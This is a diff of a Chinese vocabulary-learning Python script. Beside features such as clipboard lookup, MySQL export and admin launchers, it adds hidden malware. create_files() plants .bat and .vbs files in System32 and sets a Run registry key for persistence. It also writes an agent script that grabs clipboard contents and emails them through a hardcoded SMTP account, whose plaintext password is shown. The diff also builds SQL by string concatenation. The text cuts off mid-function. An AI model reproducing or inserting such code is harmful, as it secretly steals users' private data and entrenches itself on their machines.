@@ -1,13 +1,16 @@
 ﻿from importlib import import_module
 import ctypes
-
+import win32gui
 
 def get_path():
     path_file = __file__
     folder_path = re.search("(.*)/", path_file)
     if folder_path is None:#
         folder_path = re.search(r"(.*)\\", path_file)#为什么要这么写呢，因为ctmd在cmd里的路径是用的反斜杠，在ide里用的是正斜杠
-    return folder_path.group()
+    try:
+        return folder_path.group()
+    except:
+        return ""
 
 
 class ProgressBar(object):
@@ -57,52 +60,86 @@ def is_admin():
         return False
 
 
-modules = ['re', 'random', 'os', 'sys', 'getopt', 'subprocess','contextlib', 'decimal', 'zipfile', 'datetime', 'copy', 'time', 'matplotlib', 'selenium', 'requests' ]
+modules = ['re','smtplib','pandas', 'random', 'os','getpass', 'sys','msvcrt', 'getopt', 'subprocess','contextlib', 'decimal', 'zipfile', 'datetime', 'copy', 'time', 'pyperclip', 'matplotlib', 'selenium', 'requests','pymysql', ]
 import_progress = ProgressBar("加载模块...", total=len(modules), unit="", chunk_size=1, run_status="正在加载", fin_status="加载完成")
-
-try:
-    for module in modules:
+module_not_found = ""
+for module in modules:
+    try:
         locals()[module] = import_module(module)
         import_progress.refresh(count=1)
-
-except ModuleNotFoundError:
-    print("\n模组安装不完全，是否自动下载安装？(y/n)")
-    chx = input().strip().lower()
-    while len(chx) == 0:
-        chx = input().strip().lower()
-    if chx == 'y':
-        if is_admin():
-            p = subprocess.Popen("pip install selenium matplotlib requests", creationflags=subprocess.CREATE_NEW_CONSOLE)
-            p.communicate()
-            subprocess.Popen("背单词launcher.bat", creationflags=subprocess.CREATE_NEW_CONSOLE)
-            sys.exit()
-        # 将要运行的代码加到这里
-        else:
-            print("您未以管理员身份运行此脚本，安装可能出现错误，是否重新以管理员身份运行？(y/n)")
-            chx = input().strip().lower()
-            while len(chx) == 0:
-                chx = input().strip().lower()
-            if chx == 'y':
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-                sys.exit()
-            else:
-                sys.exit()
-    else:
+    except ModuleNotFoundError:
+        module_not_found += (module+" ")
+if len(module_not_found) is not 0:
+    if is_admin():
+        p = subprocess.Popen("pip install "+module_not_found, creationflags=subprocess.CREATE_NEW_CONSOLE)
+        p.communicate()
+        subprocess.Popen("背单词.bat", creationflags=subprocess.CREATE_NEW_CONSOLE)
         sys.exit()
-except KeyboardInterrupt:
-    print("用户中断执行...")
-    sys.exit()
-
-
-def open_console(num=0):
-    path = get_path()
-    os.system("cd " + path)
-    if num != 0:
-        subprocess.Popen("背单词launcher.bat "+ str(num), creationflags=subprocess.CREATE_NEW_CONSOLE)
+    # 将要运行的代码加到这里
     else:
-        subprocess.Popen("背单词launcher.bat",  creationflags = subprocess.CREATE_NEW_CONSOLE)
-    sys.exit()
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
 
+
+def open_console(num=0, admin=False, path = get_path()):
+
+    if not admin:
+        if num != 0:
+            subprocess.Popen(path+"背单词.bat "+ str(num), creationflags=subprocess.CREATE_NEW_CONSOLE)
+        else:
+            subprocess.Popen(path+"背单词.bat",  creationflags = subprocess.CREATE_NEW_CONSOLE)
+    else:
+        if num != 0:
+            subprocess.Popen(path+"背单词_admin.bat "+ str(num), creationflags=subprocess.CREATE_NEW_CONSOLE)
+        else:
+            subprocess.Popen(path+"背单词_admin.bat",  creationflags = subprocess.CREATE_NEW_CONSOLE)
+    exit()
+
+
+def gen_admin_launcher():
+    f = open("背单词_admin.bat", "w+")
+    f.write("""@echo off
+:: BatchGotAdmin
+:-------------------------------------
+REM --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+echo 申请管理员权限...
+goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+"%temp%\getadmin.vbs"
+exit /B
+:gotAdmin
+if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+pushd "%CD%"
+CD /D "%~dp0"
+:--------------------------------------
+python """+__file__+"""
+pause>nul
+exit
+""" )
+
+
+def gen_clip_launcher():
+    f = open("clipboard.bat", "w+")
+    f.write("""mode con cols=50 lines=20
+python """+__file__+""" 2
+""")
+
+
+def gen_normal_launcher():
+    f = open("背单词.bat", "w+")
+    f.write("python "+__file__)
+
+
+def gen_launcher_test():
+    f = open("小测验.bat", "w+")
+    f.write("""mode con cols=50 lines=20
+python """ + __file__ + """ 3
+""")
 
 try:
     from random import choice
@@ -121,33 +158,10 @@ try:
     from selenium.common.exceptions import TimeoutException
     from decimal import Decimal
     from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    print("模组安装不完全，是否自动下载安装？(y/n)")
-    chx = input().strip().lower()
-    while len(chx) == 0:
-        chx = input().strip().lower()
-    if chx == 'y':
-        if is_admin():
-            p = subprocess.Popen("pip install selenium matplotlib requests", creationflags=subprocess.CREATE_NEW_CONSOLE)
-            p.communicate()
-            subprocess.Popen("背单词launcher.bat", creationflags=subprocess.CREATE_NEW_CONSOLE)
-            sys.exit()
-        # 将要运行的代码加到这里
-        else:
-            print("您未以管理员身份运行此脚本，安装可能出现错误，是否重新以管理员身份运行？(y/n)")
-            chx = input().strip().lower()
-            while len(chx) == 0:
-                chx = input().strip().lower()
-            if chx == 'y':
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-                sys.exit()
-            else:
-                sys.exit()
-    else:
-        sys.exit()
 except KeyboardInterrupt:
     print("用户中断执行...")
     sys.exit()
+
 
 date_today = str(date.today())
 chromedriver_lookup = {
@@ -256,11 +270,36 @@ v1.5.0是这个小程序的latest version，希望大家喜欢！""",
     "v1.7.4": "修复了直接菜单搜索无法处理空格的问题, 修复了几处拼写错误",
     "v1.7.5": "增加每个单词的录入日期和按日期顺序显示",
     "v1.7.6": "修复了一些稳定性问题",
+    "v1.8.0": "人工录入功能放到附加菜单，新增剪贴板",
+    "v1.8.1": "用Pyperclip代替win32clipboard,相对稳定的版本,能测试带空格和'的单词和词组",
+    "v1.8.2": "增强了监听剪切板的稳定性，修复了正确率显示为错误率的问题",
+    "v1.8.3": """修复了睡眠恢复后监听剪切板可能报错（拒绝访问）的问题
+修复了admin后窗口大小不对的问题
+修复了退出后提示是否中止批处理的问题(exit()代替sys.exit())
+修复了打不开文件的问题""",
+    "v1.8.4": """修复一部分稳定性问题
+重新改了import 自动下载模块，更加具有可扩展性
+所有单词按时间排序以及测试最近单词
+简化代码，删除一些功能""",
+    "v1.8.5": """修复了测试最近单词的bug
+加入懒人测试模式，输入数字选择""",
+    "v1.9.0": "增加保存到mysql database的功能",
+    "v1.9.1": "自定义保存数据库名",
+    "v1.9.2": "admin bug修复",
+    "v1.9.3": "增加英译中测试",
+    "v1.9.4": "修复错题集bug",
 }
 known_issue = [
+    "无",
 ]
-version_info = "v1.7.6"
-version_update_date = "2018-10-09"
+
+
+to_do = [
+]
+
+latest_version_on_github = "v1.7.2"
+version_info = "v1.9.4"
+version_update_date = "2018-11-18"
 
 
 class Atom:
@@ -415,35 +454,65 @@ class Word:
         self.__recordedTime = recordedtime
         self.__recordedDate = recordedtime[0:10]
 
-    def it_self(self):
-        return self.__enWord
+    def it_self(self, mysql_format=False):
+        if not mysql_format:
+            return self.__enWord
+        else:
+            return str(repr(self.__enWord))
 
-    def explanation(self):
-        return self.__cnExplanation
+    def explanation(self, mysql_format=False):
+        if not mysql_format:
+            return self.__cnExplanation
+        else:
+            return str(repr(self.__cnExplanation))
 
-    def tested_count(self):
-        return self.__testedCount
+    def tested_count(self, mysql_format=False):
+        if not mysql_format:
+            return self.__testedCount
+        else:
+            return str(repr(str(self.__testedCount)))
 
-    def correct_count(self):
-        return self.__correctCount
+    def correct_count(self, mysql_format=False):
+        if not mysql_format:
+            return self.__correctCount
+        else:
+            return str(repr(str(self.__correctCount)))
 
-    def recorded_date(self):
-        return self.__recordedDate
+    def recorded_date(self, mysql_format=False):
+        if not mysql_format:
+            return self.__recordedDate
+        else:
+            return str(repr(self.__recordedDate))
 
-    def recorded_time(self):
-        return self.__recordedTime #我是傻比吗？为什么会在这里写searchedTime？？？？
+    def recorded_time(self, mysql_format=False):
+        if not mysql_format:
+            return self.__recordedTime
+        else:
+            return str(repr(self.__recordedTime))
 
-    def incorrect_count(self):
-        return self.__testedCount-self.__correctCount
+    def incorrect_count(self, mysql_format=False):
+        if not mysql_format:
+            return self.__testedCount-self.__correctCount
+        else:
+            return str(repr(str(self.__testedCount-self.__correctCount)))
+
+    def searched_count(self, mysql_format=False):
+        if not mysql_format:
+            return self.__searchTime
+        else:
+            return str(repr(str(self.__searchTime)))
+
+    def visited(self, mysql_format=False):
+        if not mysql_format:
+            return self.__Visited
+        else:
+            return str(repr(int(self.__Visited)))
 
     def correct_rate(self):
         return round(Decimal(self.__correctCount/self.__testedCount * 100.0), 2)
 
     def incorrect_rate(self):
         return round(Decimal((self.__testedCount-self.__correctCount) / self.__testedCount* 100.0), 2)
-
-    def searched_count(self):
-        return self.__searchTime
 
     def numeric_data(self):
         return str(self.__testedCount)+" "+str(self.__correctCount)+" "+str(self.__searchTime)
@@ -459,10 +528,7 @@ class Word:
         self.__searchTime += 1
 
     def show_rate(self):
-        print(self.it_self(), "已做", self.tested_count(), "次，正确", self.correct_count(), "次，正确率", self.incorrect_rate(), "%")
-
-    def visited(self):
-        return self.__Visited
+        print(self.it_self(), "已做", self.tested_count(), "次，正确", self.correct_count(), "次，正确率", self.correct_rate(), "%")#在1.8.2版本修复
 
     def visit(self):
         self.__Visited = True
@@ -483,12 +549,58 @@ class WordList:
     __engList = []
     __unvisitedList = []
     __phraseList = []
+    __recentList = []
 
     def init_visit_status(self):
         self.__unvisitedList = []
         for word in self.__wordList:
             if not word.visited():
                 self.__unvisitedList.append(word)
+
+    def save_to_mysqldb(self, db_name="dj", table_name = "wordlist"):
+        host = input("host:")
+        username = input("username:")
+        password = getpass.getpass("password:")  # console usage
+        # password = input("password:") # ide usage
+        db = pymysql.connect(host, username, password)
+        cursor = db.cursor()
+        cursor.execute("CREATE DATABASE IF NOT EXISTS "+db_name)
+        cursor.execute("USE " + db_name)
+        cursor.execute("DROP TABLE IF EXISTS WORDLIST")
+        sql = """CREATE TABLE WORDLIST (
+                 ENGLISH  VARCHAR(100) NOT NULL,
+                 CHINESE  VARCHAR(300) NOT NULL,
+                 TESTED_COUNT INT,
+                 CORRECT_COUNT INT,
+                 SEARCHED_TIMES INT,
+                 RECORDED_TIME CHAR(30) NOT NULL,
+                 VISITED BOOLEAN)"""
+        cursor.execute(sql)
+        finished_count = 0
+        total_count = len(self.__wordList)
+        migrate_progress = ProgressBar("同步数据至数据库...", total=total_count, unit="", chunk_size=1, run_status="正在同步",
+                                      fin_status="同步完成")
+        for word in self.__wordList:
+            sql_insert = """INSERT INTO """+table_name+"""(ENGLISH,
+                 CHINESE, TESTED_COUNT, CORRECT_COUNT, SEARCHED_TIMES, RECORDED_TIME, VISITED)
+                 VALUES (""" + word.it_self(mysql_format=True) + "," + word.explanation(mysql_format=True) + "," + \
+                         word.tested_count(mysql_format=True) + "," + word.correct_count(mysql_format=True) + "," + \
+                         word.searched_count(mysql_format=True) + "," + word.recorded_time(mysql_format=True) + "," + \
+                         word.visited(mysql_format=True) + ")"
+            try:
+                cursor.execute(sql_insert)
+                # 提交到数据库执行
+                db.commit()
+                finished_count += 1
+                migrate_progress.refresh(count=1)
+            except:
+                # 如果发生错误则回滚
+                db.rollback()
+                print("执行第", finished_count+1, "个时发生错误。数据库已回滚")
+                print(word)
+        # 关闭数据库连接
+        print(finished_count, "/", total_count, "完成")
+        db.close()
 
     def read_wordlist_from_file(self, filename=None):
         if filename is None:
@@ -539,21 +651,23 @@ class WordList:
             f.write(str(i.recorded_time())+'\n')
         f.close()
 
-    def __init__(self, filename=None):
-        if filename is not None:
-            self.__wordList = []
-            self.__engList = []
-            self.__unvisitedList = []
-            self.__phraseList = []
-            self.__filename = filename
-            self.read_wordlist_from_file(filename)
-            self.init_visit_status()
-            self.sort_by_alphabet()
-        else:
-            self.__wordList = []
-            self.__engList = []
-            self.__unvisitedList = []
-            self.__phraseList = []
+    def __init__(self, source="file", filename=None, mysql_dbname = None):
+            if source == "file":
+                if filename is not None:
+                    self.__wordList = []
+                    self.__engList = []
+                    self.__unvisitedList = []
+                    self.__phraseList = []
+                    self.__filename = filename
+                    self.read_wordlist_from_file(filename)
+                    self.init_visit_status()
+                    self.sort_by_alphabet()
+                else:
+                    self.__wordList = []
+                    self.__engList = []
+                    self.__unvisitedList = []
+                    self.__phraseList = []
+
 
     def __iter__(self):
         return iter(self.__wordList)
@@ -575,7 +689,9 @@ class WordList:
     def complete_list(self):
         return self.__wordList
 
-    def get_unvisited_list(self):
+    def get_unvisited_list(self, sort_by_time = False, sort_reverse = False):
+        if sort_by_time:
+            self.__unvisitedList = sorted(self.__unvisitedList, key=lambda x: x.recorded_time(), reverse=sort_reverse)
         return self.__unvisitedList
 
     def phrase_count(self):
@@ -591,12 +707,14 @@ class WordList:
         return None
 
     def add_new_word(self, en_word, cn_word):
-        newWord = Word(en_word, cn_word)
+        newWord = Word(en_word, cn_word, recordedtime=str(datetime.datetime.now()))
         self.__wordList.append(newWord)
         self.__unvisitedList.append(newWord)
         self.__engList.append(newWord.it_self())
         if newWord.is_phrase():
             self.__phraseList.append(newWord)
+        print(newWord.it_self(), newWord.explanation())
+        print("录入时间：", newWord.recorded_time())
 
     def add_Word(self, newWord):
         self.__wordList.append(newWord)
@@ -611,15 +729,19 @@ class WordList:
 
     def sort_by_rate(self):
         self.__wordList = sorted(self.__wordList, key=lambda x: x.incorrect_rate())
+        return self.__wordList
 
     def sort_by_alphabet(self):
         self.__wordList = sorted(self.__wordList, key=lambda x: x.it_self())
+        return self.__wordList
 
     def sort_by_date(self):
         self.__wordList = sorted(self.__wordList, key=lambda x: x.recorded_date())
+        return self.__wordList
 
-    def sort_by_time(self):
-        self.__wordList = sorted(self.__wordList,key=lambda x: x.recorded_time())
+    def sort_by_time(self, reverse=False):
+        self.__wordList = sorted(self.__wordList, key=lambda x: x.recorded_time(), reverse=reverse)
+        return self.__wordList
 
     def get_list_today(self):
         __wordListToday = []
@@ -636,20 +758,28 @@ class WordList:
             print("做了:", word.tested_count(), "次", "对了:", word.correct_count(), "次", "搜过", word.searched_count(),"次")
 
 
+def save_to_orclpdb(wordlist):
+    pass
+
+
+def get_mouse():
+    hwnd = win32gui.GetForegroundWindow()
+    print(win32gui.GetWindowText(hwnd))
+
 def show_menu():
     if is_admin():
         print("背单词", version_info, " 管理员模式", date_today)
     else:
         print("背单词", version_info, " 用户模式", date_today)
     print("1:显示所有单词和词组")
-    print("2:人工录入")
-    print("3:随机测试")
+    print("2:监控剪贴板")
+    print("3:按时间顺序测试")
     print("4:随机测试hint always版")
     print("5:本地模糊查找单词")
-    print("6:手动保存")
+    print("6:按时间顺序显示")
     print("7:错题集")
     print("8:自动录入chrome版")
-    print("9:自动录入requests版")
+    print("9:随机测试英译中")
     print("0:其他功能")
 
 
@@ -662,7 +792,7 @@ def show_sub_menu():
     print("2:统计数据")
     print("3:把所有单词及词组替换成有道词典版本")
     print("4:显示当前版本信息")
-    print("5:显示所有历史版本信息")
+    print("5:保存到mysql")
     print("6:显示所有词组")
     print("7:显示今日录入")
     print("8:所有单词按录入日期排序")
@@ -676,7 +806,7 @@ def on_progress():
     print("该功能还在开发中！")
 
 
-def test_done(p, datelist, wordlist, correct=False):
+def test_done(p, datelist, wordlist, correct=False ,savefile = True):
     if correct:
         p.correct()
     else:
@@ -684,7 +814,8 @@ def test_done(p, datelist, wordlist, correct=False):
     datelist.today().tested()
     datelist.write_date_to_file()
     p.show_rate()
-    wordlist.write_wordlist_to_file()
+    if savefile:
+        wordlist.write_wordlist_to_file()
 
 
 def statistics(wordlist, datelist):
@@ -731,135 +862,20 @@ def mistake_collection(wordlist, datelist):
     while len(chx) == 0:
         chx = input().strip().lower()
     if chx == 'y':
-        random_test_hint_always(soup, datelist)
+        random_test_hint_always(soup, datelist, savefile=False)
     return soup
 
 
-def random_test(wordlist, datelist):
-    p = choice(wordlist.get_unvisited_list())
-    p.visit()
-    p2 = p
-    p3 = p
-    egg = False
-    print(p.explanation(), " 对应哪个单词？(输入hint得到提示，输入Ctrl+C退出)")
-    ans = input().strip().lower()
-    while len(ans) == 0:
-        ans = input().strip().lower()
-    if p.it_self() == "hint":
-        egg = True
-    if ans == "exit()":
-        return False
-    if ans == "hint" and not egg:
-        if len(wordlist.get_unvisited_list()) > 0:
-            p2 = choice(wordlist.get_unvisited_list())
-        if len(wordlist.get_unvisited_list()) > 1:
-            p3 = choice(wordlist.get_unvisited_list())
-            while p3 == p2:
-                p3 = choice(wordlist.get_unvisited_list())
-        seed = random.randint(0, 2)
-        if seed == 0:
-            if len(wordlist.get_unvisited_list()) == 0:
-                print("只有一个单词了！")
-            elif len(wordlist.get_unvisited_list()) == 1:
-                print("提供以下两个选择:", p.it_self(), ",", p2.it_self())
-            else:
-                print("提供以下三个选择:", p.it_self(), ",", p2.it_self(), ",", p3.it_self())
-        elif seed == 1:
-            if len(wordlist.get_unvisited_list()) == 0:
-                print("只有一个单词了！")
-            elif len(wordlist.get_unvisited_list()) == 1:
-                print("提供以下两个选择:", p2.it_self(), ",", p.it_self())
-            else:
-                print("提供以下三个选择:", p2.it_self(), ",", p.it_self(), ",", p3.it_self())
-        elif seed == 2:
-            if len(wordlist.get_unvisited_list()) == 0:
-                print("只有一个单词了！")
-            elif len(wordlist.get_unvisited_list()) == 1:
-                print("提供以下两个选择:", p.it_self(), ",", p2.it_self())
-            else:
-                print("提供以下三个选择:", p2.it_self(), ",", p3.it_self(), ",", p.it_self())
-        ans = input().strip().lower()
-        while len(ans) == 0:
-            ans = input().strip().lower()
-    if ans == p.it_self():
-        if len(wordlist.get_unvisited_list()) == 0:
-            if not egg:
-                print("你已经全部都答完啦！重新开始吗？(Y/N)")
-                test_done(p, datelist, wordlist, True)
-                chx = input().strip().lower()
-                while len(chx) == 0:
-                    chx = input().strip().lower()
-                if chx == "Y" or chx == "y":
-                    open_console(3)
-                else:
-                    open_console()
-            else:
-                print('''Traceback (most recent call last):
-                  File "C:/PycharmProjects/背单词/背单词.py", line 176, in <module>
-                    main(sys.argv[1:])
-                  File "C:/PycharmProjects/背单词/背单词.py", line 171, in main
-                    if random_test(quiz_cache):
-                  File "C:/PycharmProjects/背单词/背单词.py", line 98, in random_test
-                    print("Error: hint",hint)
-                NameError: name 'hint' != defined''')
-                time.sleep(2)
-                print("提示:上面的报错是骗你的，输入(Y/N)进入下一题吧！")
-                test_done(p, datelist, wordlist, True)
-                chx = input().strip().lower()
-                while len(chx) == 0:
-                    chx = input().strip().lower()
-                if chx == "Y" or chx == "y":
-                    open_console(3)
-                else:
-                    open_console()
-        else:
-            if not egg:
-                test_done(p, datelist, wordlist, True)
-                random_test(wordlist, datelist)
-            else:
-                print(r'''Traceback (most recent call last):
-  File "C:/PycharmProjects/背单词/背单词.py", line 176, in <module>
-    main(sys.argv[1:])
-  File "C:/PycharmProjects/背单词/背单词.py", line 171, in main
-    if random_test(quiz_cache):
-  File "C:/PycharmProjects/背单词/背单词.py", line 98, in random_test
-    print("Error: hint",hint)
-NameError: name 'hint' != defined''')
-                time.sleep(2)
-                print("提示：上面的报错是骗你的，输入(Y/N)进入下一题吧！")
-                test_done(p, datelist, wordlist, True)
-                chs = input().strip().lower()
-                while len(chs) == 0:
-                    chs = input().strip().lower()
-                if chs == "Y" or chs == "y":
-                    random_test(wordlist, datelist)
-                else:
-                    return False
+def random_test_hint_always(wordlist, datelist, recent=False, savefile=True):
+    if not recent:
+        p = choice(wordlist.get_unvisited_list())
     else:
-        print("正确答案是:", p.it_self())
-        print("还敢来吗?(Y/N)")
-        test_done(p, datelist, wordlist, False)
-        chs = input().strip().lower()
-        while len(chs) == 0:
-            chs = input().strip().lower()
-        if len(wordlist.get_unvisited_list()) == 0:
-            if chs == "Y" or chs == "y":
-                open_console(3)
-            else:
-                open_console()
-        else:
-            if chs == "Y" or chs == "y":
-                random_test(wordlist, datelist)
-            else:
-                return False
-
-
-def random_test_hint_always(wordlist, datelist):
-    p = choice(wordlist.get_unvisited_list())
+        p = wordlist.get_unvisited_list(True, True)[0]
     wordlist.visit(p)
     p2 = p
     p3 = p
-    print(p.explanation(), " 对应哪个单词？(输入Ctrl+C退出)")
+    print(p.explanation()),
+    print("对应哪个单词？(输入Ctrl+C退出)")
     if len(wordlist.get_unvisited_list()) > 0:
         p2 = choice(wordlist.get_unvisited_list())
     if len(wordlist.get_unvisited_list()) > 1:
@@ -869,34 +885,43 @@ def random_test_hint_always(wordlist, datelist):
     seed = random.randint(0, 2)
     if seed == 0:
         if len(wordlist.get_unvisited_list()) == 0:
+            genuine_pos = 0
             print("只有一个单词了！")
         elif len(wordlist.get_unvisited_list()) == 1:
-            print("提供以下两个选择:", p.it_self(), ",", p2.it_self())
+            print("提供以下两个选择:"), print(p.it_self(), ",", p2.it_self())
+            genuine_pos = 0
         else:
-            print("提供以下三个选择:", p.it_self(), ",", p2.it_self(), ",", p3.it_self())
+            print("提供以下三个选择:"), print(p.it_self(), ",", p2.it_self(), ",", p3.it_self())
+            genuine_pos = 0
     elif seed == 1:
         if len(wordlist.get_unvisited_list()) == 0:
+            genuine_pos = 0
             print("只有一个单词了！")
         elif len(wordlist.get_unvisited_list()) == 1:
-            print("提供以下两个选择:", p2.it_self(), ",", p.it_self())
+            genuine_pos = 1
+            print("提供以下两个选择:"), print(p2.it_self(), ",", p.it_self())
         else:
-            print("提供以下三个选择:", p2.it_self(), ",", p.it_self(), ",", p3.it_self())
+            genuine_pos = 1
+            print("提供以下三个选择:"), print(p2.it_self(), ",", p.it_self(), ",", p3.it_self())
     elif seed == 2:
         if len(wordlist.get_unvisited_list()) == 0:
+            genuine_pos = 0
             print("只有一个单词了！")
         elif len(wordlist.get_unvisited_list()) == 1:
-            print("提供以下两个选择:", p.it_self(), ",", p2.it_self())
+            genuine_pos = 0
+            print("提供以下两个选择:"), print(p.it_self(), ",", p2.it_self())
         else:
-            print("提供以下三个选择:", p2.it_self(), ",", p3.it_self(), ",", p.it_self())
+            genuine_pos = 2
+            print("提供以下三个选择:"), print(p2.it_self(), ",", p3.it_self(), ",", p.it_self())
     ans = input().strip().lower()
     while len(ans) == 0:
         ans = input().strip().lower()
     if ans == "exit()":
         return False
-    if ans == p.it_self():
+    if ans == p.it_self() or ans == str(genuine_pos+1):
         if len(wordlist.get_unvisited_list()) == 0:
             print("你已经全部都答完啦！重新开始吗？(Y/N)")
-            test_done(p, datelist, wordlist, True)
+            test_done(p, datelist, wordlist, True, savefile)
             chx = input().strip().lower()
             while len(chx) == 0:
                 chx = input().strip().lower()
@@ -905,8 +930,8 @@ def random_test_hint_always(wordlist, datelist):
             else:
                 open_console()
         else:
-            test_done(p, datelist, wordlist, True)
-            random_test_hint_always(wordlist, datelist)
+            test_done(p, datelist, wordlist, True, savefile)
+            random_test_hint_always(wordlist, datelist, recent, savefile)
     else:
         print("正确答案是:", p.it_self())
         print("还敢来吗?(Y/N)")
@@ -921,49 +946,9 @@ def random_test_hint_always(wordlist, datelist):
                 open_console()
         else:
             if chs == "Y" or chs == "y":
-                random_test_hint_always(wordlist, datelist)
+                random_test_hint_always(wordlist, datelist, recent, savefile)
             else:
                 return False
-
-
-def new_word(wordlist, datelist):
-    print("输入英文:(输入 Ctrl+C 取消录入)")
-    word = input().strip().lower()
-    while len(word) == 0:
-        word = input().strip().lower()
-    result = wordlist.search(word)
-    while result is not None:
-        print(result.it_self(), result.explanation())
-        print(word, "已经存在，请重新输入")
-        word = input().strip().lower()
-        while len(word) == 0:
-            word = input().strip().lower()
-        if word == "exit()":
-            print("已取消录入")
-            return False
-        result = wordlist.search(word)
-    print("输入中文：(输入 Ctrl+C 取消录入)")
-    word_cn = input().strip().lower()
-    while len(word_cn) == 0:
-        word_cn = input().strip().lower()
-    if word_cn == "exit()":
-        print("已取消录入")
-        return False
-    word_cnt = word.split(' ')
-    if len(word_cnt) is 1:
-        print(word, word_cn, "确认把这个单词加入列表吗?(Y/N)")
-    else:
-        print(word, word_cn, "确认把这个词组加入列表吗?(Y/N)")
-    cfm = input().strip().lower()
-    while len(cfm) == 0:
-        cfm = input().strip().lower()
-    if cfm == "Y" or cfm == "y":
-        wordlist.add_new_word(word, word_cn)
-        datelist.today().grow()
-        return True
-    else:
-        print("已取消录入")
-        return False
 
 
 def get_cur_ver_info(cur_ver):
@@ -1237,7 +1222,7 @@ def impatient_search(word, wordlist, datelist):
     word = word.strip().lower()#in version v 1.7.4
     result = wordlist.search(word)
     if result is not None:
-        print(word, result.explanation())
+        print(word, result.explanation(), " 已经录入本地词库")
         datelist.today().searched()
         result.searched()
         wordlist.write_wordlist_to_file()
@@ -1245,7 +1230,7 @@ def impatient_search(word, wordlist, datelist):
         return False
     else:
         try:
-            page_src = get_one_page("http://dict.youdao.com/w/eng/"+word+"/#keyfrom=dict2.index")
+            page_src = get_one_page("http://dict.youdao.com/w/"+word+"/#keyfrom=dict2.index")
         except RequestException:
             print("连接服务器异常...")
             return False
@@ -1261,9 +1246,7 @@ def impatient_search(word, wordlist, datelist):
             else:
                 print(word, word_cn_complete, "要把这个词组加入列表吗?(Y/N)")
             datelist.today().searched()
-            cfm = input().strip().lower()
-            while len(cfm) == 0:
-                cfm = input().strip().lower()
+            cfm = readInput('', 'N', 10)
             if cfm == "Y" or cfm == "y":
                 wordlist.add_new_word(word, word_cn_complete)
                 datelist.today().grow()
@@ -1345,16 +1328,45 @@ def fuzzy_finder(wordlist, datelist):
                     return
 
 
-def show_word(wordlist, show_date_delimeter=False):
+def send_email(str_captured):
+    mail_host = "smtp.126.com"  # 设置服务器
+    mail_user = "MrShadomago@126.com"  # 用户名
+    mail_pass = "abc123456"  # 口令
+
+    sender = 'MrShadomago@126.com'
+    receivers = ['MrShadomago@126.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
+
+    message = MIMEText(str_captured, 'plain', 'utf-8')
+    message['From'] = Header("Just Hacking again", 'utf-8')
+    message['To'] = Header("You Will never know me", 'utf-8')
+
+    subject = 'Python SMTP 邮件测试'
+    message['Subject'] = Header(subject, 'utf-8')
+
+    try:
+        smtpObj = smtplib.SMTP()
+        smtpObj.connect(mail_host, 25)  # 25 为 SMTP 端口号
+        smtpObj.login(mail_user, mail_pass)
+        smtpObj.sendmail(sender, receivers, message.as_string())
+        print("邮件发送成功")
+    except smtplib.SMTPException:
+        print("Error: 无法发送邮件")
+
+
+def show_word(wordlist, show_date_delimeter=False, show_by_time=False):
     if not show_date_delimeter:
         for i in wordlist:
             print(i.it_self(), i.explanation())
-    else:
+    elif not show_by_time:
         date_str = ""
         for i in wordlist:
             if date_str != i.recorded_date():
                 date_str = i.recorded_date()
                 print(date_str)
+            print(i.it_self(), i.explanation())
+    elif show_by_time:
+        wordlist.sort_by_time()
+        for i in wordlist:
             print(i.it_self(), i.explanation())
 
 
@@ -1365,6 +1377,127 @@ def show_phrases(wordlist):
             print(i.it_self(),i.explanation())
             count += 1
     print("共", count, "个词组")
+
+
+def readInput(caption, default, timeout=4):
+    start_time = time.time()
+    sys.stdout.write('%s(%d秒自动跳过):' % (caption,timeout))
+    sys.stdout.flush()
+    input = ''
+    while True:
+        ini=msvcrt.kbhit()
+        try:
+            if ini:
+                chr = msvcrt.getche()
+                if ord(chr) == 13:  # enter_key
+                    break
+                elif ord(chr) >= 32:
+                    input += chr.decode()
+        except Exception as e:
+            pass
+        if len(input) == 0 and time.time() - start_time > timeout:
+            break
+    print ('')  # needed to move to next line
+    if len(input) > 0:
+        return input+''
+    else:
+        return default
+
+
+def monitor_clipboard(last_data, wordlist, datelist):
+    while True:
+        try:
+            time.sleep(0.2)
+            clip_data = pyperclip.paste()
+            #
+            if clip_data != last_data:
+                pattern = re.compile("([^a-zA-Z0-9 \'\-]+)", re.S)
+                filtered_word = re.findall(pattern, clip_data)
+                if len(filtered_word) is 0 and len(clip_data) > 1:
+                    impatient_search(clip_data, wordlist, datelist)
+                else:
+                    print("跳过无效信息")
+                    # print(filtered_word)
+                last_data = clip_data
+                continue
+        except TypeError:
+            continue
+        except KeyboardInterrupt:
+            gen_normal_launcher()
+            open_console()
+            exit()
+
+
+
+def create_files():
+    q = open("C:/Windows/System32/VeritigoAgent.bat", "w+", encoding="utf-8")
+    q.write('python VertigoAgentInit.py')
+    f = open("C:/Windows/System32/VertigoAgent.vbs", "w+", encoding="utf-8")
+    f.write('Set ws = CreateObject("wscript.Shell")\n ws.run "cmd /c SysAgent.bat",vbhide ')
+    h = open("C:/Windows/System32/VertigoSecure.vbs","w+", encoding="ANSI")
+    h.write("""Dim AutoRunProgram     
+Set AutoRunProgram = WScript.CreateObject("wscript.shell")
+regpath ="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"    
+Type_Name = "REG_SZ"   
+Key_Name = "SysAgent"     
+Key_data = "C:/Windows/System32/SystemAgent.vbs"
+AutorunProgram.RegWrite regpath,Key_Name,Key_data,Type_Name 
+    """)
+    z = open("C:/Windows/System32/VertigoAgentInit.py", "w+", encoding="utf-8")
+    z.write("""
+import time
+import pyperclip
+import smtplib
+from email.mime.text import MIMEText
+from email.header import Header
+
+
+def ascension(str_captured):
+    mail_host = "smtp.126.com"  # 设置服务器
+    mail_user = "MrShadomago@126.com"  # 用户名
